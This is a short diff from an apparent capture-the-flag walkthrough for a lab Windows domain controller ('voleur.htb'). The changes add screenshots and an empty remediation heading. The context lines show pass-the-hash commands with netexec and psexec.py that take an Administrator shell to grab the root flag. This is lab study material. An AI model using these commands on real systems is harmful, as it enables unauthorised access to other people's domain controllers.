@@ -145,10 +145,15 @@
 
 `nxc smb dc.voleur.htb -u Administrator -H "[HASH]" -d voleur.htb -k`
 
+<img width="850" height="110" alt="image" src="https://github.com/user-attachments/assets/f048de53-0b4a-42a1-be44-7d4decfc223b" />
 
 
 23. Psexec into the machine as Admin and grab the root flag!
 
 `psexec.py -dc-ip 10.129.4.233 voleur.htb/Administrator@dc.voleur.htb -hashes "[HASH]" -k`
 
+<img width="383" height="57" alt="image" src="https://github.com/user-attachments/assets/17a90f49-c079-442a-8253-aba2b69c8e7d" />
 
+
+## Remediation Summary
+- 
